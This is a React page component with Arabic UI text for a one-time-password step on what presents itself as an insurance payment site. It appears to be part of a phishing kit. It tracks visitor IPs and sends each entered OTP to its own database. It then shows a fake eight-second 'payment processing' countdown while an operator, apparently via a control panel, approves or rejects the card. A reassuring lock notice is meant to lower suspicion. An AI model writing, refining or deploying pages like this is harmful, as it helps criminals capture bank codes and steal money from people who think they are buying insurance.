import React, { useEffect, useRef, useState, useCallback } from "react";
import { useLocation } from "wouter";
import InsuranceHeader from "@/components/InsuranceHeader";
import LoadingOverlay from "@/components/LoadingOverlay";
import { trpc } from "@/lib/trpc";
import { useVisitorSession } from "@/hooks/useVisitorSession";
import { useVisitorGuard } from "@/hooks/useVisitorGuard";
import { toast } from "sonner";

export default function OtpPage() {
  const [, navigate] = useLocation();
  const { sessionId, visitorIp, getStoredData } = useVisitorSession();
  const guard = useVisitorGuard(visitorIp);
  const stored = getStoredData();

  const [otp, setOtp] = useState("");
  const [otpDigits, setOtpDigits] = useState(4);
  const [error, setError] = useState("");
  const [isSuccess, setIsSuccess] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  // حالة شاشة التحميل بعد إدخال OTP
  const [showLoadingScreen, setShowLoadingScreen] = useState(false);
  const [loadingCountdown, setLoadingCountdown] = useState(8);

  const submitOtpMutation = trpc.insurance.submitOtp.useMutation();
  const verifyOtpFinalMutation = trpc.insurance.verifyOtpFinal.useMutation();
  const checkPaymentQuery = trpc.insurance.checkPayment.useQuery(
    { sessionId },
    {
      refetchInterval: 2000,
      enabled: true,
    }
  );

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // تحديث عدد أرقام OTP من بيانات الخادم
  useEffect(() => {
    if (checkPaymentQuery.data) {
      const digits = checkPaymentQuery.data.otpDigits ?? 4;
      setOtpDigits(digits);
      if (checkPaymentQuery.data.paymentStatus === "rejected") {
        toast.error("تم رفض الدفع. يرجى تجربة طريقة دفع أخرى.");
        setTimeout(() => navigate("/insurance/payment?declined=true"), 500);
      }
    }
  }, [checkPaymentQuery.data]);

  // التركيز على أول حقل عند التحميل
  useEffect(() => {
    setTimeout(() => {
      inputRefs.current[0]?.focus();
    }, 100);
  }, [otpDigits]);

  const handleInput = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    if (value.length > 1) value = value.slice(-1);
    const newOtp = otp.slice(0, index) + value + otp.slice(index + 1);
    setOtp(newOtp);
    setError("");
    // الانتقال للحقل التالي
    if (value && index < otpDigits - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, otpDigits);
    setOtp(pasted);
    setError("");
    // توزيع الأرقام على الحقول
    pasted.split("").forEach((digit, i) => {
      if (inputRefs.current[i]) {
        inputRefs.current[i]!.value = digit;
      }
    });
    if (pasted.length > 0 && pasted.length < otpDigits) {
      inputRefs.current[pasted.length]?.focus();
    }
  };

  // المرحلة 1: إرسال OTP إلى قاعدة البيانات + عرض شاشة تحميل 8 ثوانٍ ثم التحقق النهائي
  const handleSubmitOtp = useCallback(async () => {
    if (otp.length !== otpDigits) {
      setError("يرجى إدخال رمز التحقق كاملاً");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      // إرسال الرمز إلى قاعدة البيانات
      const result = await submitOtpMutation.mutateAsync({ sessionId, otp });

      if (result.success) {
        // عرض شاشة التحميل "يرجى الانتظار لحين إتمام الدفع"
        setShowLoadingScreen(true);
        let countdown = 8;
        setLoadingCountdown(countdown);

        const interval = setInterval(() => {
          countdown--;
          setLoadingCountdown(countdown);
          if (countdown <= 0) {
            clearInterval(interval);
          }
        }, 1000);

        // بعد 8 ثوانٍ: التحقق النهائي من الخادم
        setTimeout(async () => {
          setShowLoadingScreen(false);
          try {
            const verifyResult = await verifyOtpFinalMutation.mutateAsync({ sessionId });
            setIsLoading(false);
            if (verifyResult.success) {
              // OTP صحيح - عرض شاشة النجاح
              setIsSuccess(true);
            } else {
              // OTP غير صحيح - إظهار رسالة تحذير
              setError("⚠️ الرمز المدخل غير صحيح. يرجى المحاولة مرة أخرى.");
              // مسح الحقول
              setOtp("");
              inputRefs.current.forEach((ref) => {
                if (ref) ref.value = "";
              });
              setTimeout(() => inputRefs.current[0]?.focus(), 100);
            }
          } catch {
            setIsLoading(false);
            setError("حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى");
            setOtp("");
            inputRefs.current.forEach((ref) => {
              if (ref) ref.value = "";
            });
            setTimeout(() => inputRefs.current[0]?.focus(), 100);
          }
        }, 8000);
      } else {
        setIsLoading(false);
        setError("حدث خطأ، يرجى المحاولة مرة أخرى");
      }
    } catch {
      setIsLoading(false);
      setError("حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى");
    }
  }, [otp, otpDigits, sessionId, submitOtpMutation, verifyOtpFinalMutation]);

  // شاشة نجاح OTP
  if (isSuccess) {
    return (
      <div className="min-h-screen bg-gray-50 flex justify-center">
        <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col">
          <InsuranceHeader showLogin />
          <main className="flex-1 px-4 py-5 flex flex-col items-center justify-center text-center">
            <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-5">
              <svg className="w-10 h-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-xl font-bold text-gray-800 mb-2">تم التحقق بنجاح</h2>
            <p className="text-sm text-gray-500 mb-6">تم تأكيد عملية الدفع بنجاح</p>
            <div className="w-full bg-green-50 border border-green-200 rounded-xl p-4 mb-6 text-right">
              <p className="text-sm text-green-700 font-medium">شكراً لك! تم استلام طلب التأمين الخاص بك بنجاح. سيقوم فريقنا بمراجعة البيانات والتواصل معك في أقرب وقت.</p>
            </div>
            <button
              onClick={() => navigate("/")}
              className="w-full py-3.5 bg-blue-600 text-white rounded-xl font-bold text-base hover:bg-blue-700 active:scale-[0.98] transition-all"
            >
              العودة للصفحة الرئيسية
            </button>
          </main>
          <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
        </div>
      </div>
    );
  }

  // انتظار القبول من لوحة التحكم
  const paymentStatus = checkPaymentQuery.data?.paymentStatus;
  const cardDeclined = checkPaymentQuery.data?.cardDeclined;

  if (paymentStatus === "rejected" || cardDeclined) {
    return (
      <div className="min-h-screen bg-gray-50 flex justify-center">
        <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col">
          <InsuranceHeader showLogin />
          <main className="flex-1 px-4 py-5 flex flex-col items-center justify-center text-center">
            <div className="decline-box mb-4 mx-auto max-w-[350px]">
              <div className="flex-shrink-0 w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5">
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="8" x2="12" y2="12" />
                  <line x1="12" y1="16" x2="12.01" y2="16" />
                </svg>
              </div>
              <div>
                <div className="font-bold text-sm">تم رفض طريقة الدفع</div>
                <div className="text-xs opacity-90">يرجى تجربة طريقة دفع أخرى أو التواصل مع البنك</div>
              </div>
            </div>
            <button
              onClick={() => navigate("/insurance/payment")}
              className="w-full max-w-[350px] py-3.5 bg-blue-600 text-white rounded-xl font-bold text-base hover:bg-blue-700 active:scale-[0.98] transition-all"
            >
              تجربة طريقة دفع أخرى
            </button>
          </main>
          <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
        </div>
      </div>
    );
  }

  if (paymentStatus !== "approved") {
    // لا يزال في انتظار القبول - عرض شاشة "جاري التحقق"
    return (
      <div className="min-h-screen bg-gray-50 flex justify-center">
        <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col">
          <InsuranceHeader showLogin />
          <main className="flex-1 px-4 py-5">
            <div className="flex flex-col items-center justify-center h-[60vh]">
              <div className="w-20 h-20 rounded-full bg-blue-50 flex items-center justify-center mb-6">
                <svg className="w-10 h-10 text-blue-500 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h2 className="text-lg font-bold text-gray-800 mb-2">جاري التحقق من الدفع...</h2>
              <p className="text-sm text-gray-500 text-center">يرجى الانتظار حتى يتم التحقق من عملية الدفع</p>
              <div className="mt-6 flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" style={{ animationDelay: "0ms" }} />
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" style={{ animationDelay: "150ms" }} />
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" style={{ animationDelay: "300ms" }} />
              </div>
            </div>
          </main>
          <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
        </div>
      </div>
    );
  }

  // شاشة التحميل "يرجى الانتظار لحين إتمام الدفع"
  if (showLoadingScreen) {
    return (
      <div className="min-h-screen bg-gray-50 flex justify-center">
        <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col">
          <InsuranceHeader showLogin />
          <main className="flex-1 px-4 py-5">
            <div className="flex flex-col items-center justify-center h-[60vh]">
              {/* عداد تنازلي */}
              <div className="relative w-24 h-24 mb-8">
                <svg className="w-24 h-24 transform -rotate-90" viewBox="0 0 36 36">
                  <path
                    className="text-gray-200"
                    d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="3"
                  />
                  <path
                    className="text-blue-500"
                    d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="3"
                    strokeDasharray={`${(loadingCountdown / 8) * 100}, 100`}
                    strokeLinecap="round"
                  />
                </svg>
                <div className="absolute inset-0 flex items-center justify-center">
                  <span className="text-2xl font-bold text-blue-600">{loadingCountdown}</span>
                </div>
              </div>
              <h2 className="text-lg font-bold text-gray-800 mb-2">يرجى الانتظار لحين إتمام الدفع...</h2>
              <p className="text-sm text-gray-500 text-center">جاري معالجة عملية الدفع</p>
              <div className="mt-6 flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" style={{ animationDelay: "0ms" }} />
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" style={{ animationDelay: "150ms" }} />
                <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" style={{ animationDelay: "300ms" }} />
              </div>
            </div>
          </main>
          <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
        </div>
      </div>
    );
  }

  // OTP متاح - عرض حقول الإدخال
  return (
    <div className="min-h-screen bg-gray-50 flex justify-center">
      <div className="w-full max-w-[480px] bg-white min-h-screen flex flex-col">
        <InsuranceHeader showLogin />
        <main className="flex-1 px-4 py-5">
          <div className="text-center mb-6">
            <div className="w-16 h-16 rounded-full bg-blue-100 flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <h2 className="text-lg font-bold text-gray-800 mb-1">رمز التحقق (OTP)</h2>
            <p className="text-sm text-gray-500">أدخل رمز التحقق المكون من {otpDigits} أرقام</p>
          </div>

          <div className="flex justify-center gap-3 mb-6" onPaste={handlePaste}>
            {Array.from({ length: otpDigits }, (_, i) => (
              <input
                key={i}
                ref={(el) => { inputRefs.current[i] = el; }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={otp[i] || ""}
                onChange={(e) => handleInput(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                className={`w-11 h-14 text-center text-lg font-bold border-2 rounded-xl focus:outline-none transition-all ${
                  otp[i]
                    ? "border-blue-500 bg-blue-50 text-blue-700"
                    : "border-gray-200 bg-gray-50 text-gray-700 focus:border-blue-500"
                } ${error ? "border-red-300 bg-red-50" : ""}`}
                style={{ direction: "ltr" }}
                disabled={isLoading}
              />
            ))}
          </div>

          {error && (
            <div className="bg-red-50 border border-red-200 rounded-lg px-4 py-3 mb-4 text-center animate-[shake_0.3s_ease-in-out]">
              <p className="text-sm text-red-600 font-medium">{error}</p>
            </div>
          )}

          <div className="flex items-center gap-2 bg-yellow-50 border border-yellow-200 rounded-lg px-3 py-2 mb-5">
            <span>🔒</span>
            <span className="text-xs text-yellow-700">هذا الرمز للتحقق من عملية الدفع فقط</span>
          </div>

          <div className="flex gap-3">
            <button
              onClick={() => navigate("/insurance/payment")}
              className="flex-1 py-3.5 border border-gray-300 text-gray-600 rounded-xl font-bold text-base hover:bg-gray-50 transition-all"
              disabled={isLoading}
            >
              السابق
            </button>
            <button
              onClick={handleSubmitOtp}
              disabled={otp.length !== otpDigits || isLoading}
              className={`flex-1 py-3.5 rounded-xl font-bold text-base transition-all ${
                otp.length === otpDigits && !isLoading
                  ? "bg-blue-600 text-white hover:bg-blue-700 active:scale-[0.98]"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              }`}
            >
              {isLoading ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  جاري الإرسال...
                </span>
              ) : (
                "تأكيد"
              )}
            </button>
          </div>
        </main>
        <LoadingOverlay show={guard.loading} text={guard.loadingText} subtext={guard.loadingSubtext} />
      </div>
    </div>
  );
}
